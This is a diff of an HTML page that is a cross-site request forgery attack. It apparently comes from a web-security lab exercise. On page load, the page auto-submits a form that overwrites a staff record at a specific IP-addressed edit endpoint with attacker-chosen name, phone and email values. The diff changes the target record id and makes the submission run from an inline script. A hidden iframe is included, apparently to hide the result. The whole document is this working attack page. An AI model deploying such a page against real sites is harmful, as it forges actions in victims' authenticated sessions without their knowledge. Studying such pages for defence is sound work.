@@ -8,17 +8,19 @@
     <title>Document</title>
 </head>
 
-<body onload="document.csrfForm.submit()">
-    <form name="csrfForm" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=5" method="POST>
-        <input type="hidden" name="first_name" value="Alice">
-        <input type="hidden" name="last_name" value="Hacker">
-        <input type="hidden" name="phone" value="secret">
-        <input type="hidden" name="email" value="hacker@gmail.com">
+<!-- <body onload="document.csrfForm.submit()"> -->
+    <body>
+    <form name="csrfForm" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=1" method="POST>
+        <input type="text" name="first_name" value="Alice">
+        <input type="text" name="last_name" value="Hacker">
+        <input type="text" name="phone" value="secret">
+        <input type="text" name="email" value="hacker@gmail.com">
         <input type="submit" value="See your job functions">
     </form>
-<!--     <script>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+    <script>
         document.csrfForm.submit();
-    </script> -->
+    </script>
 </body>
 
 </html>
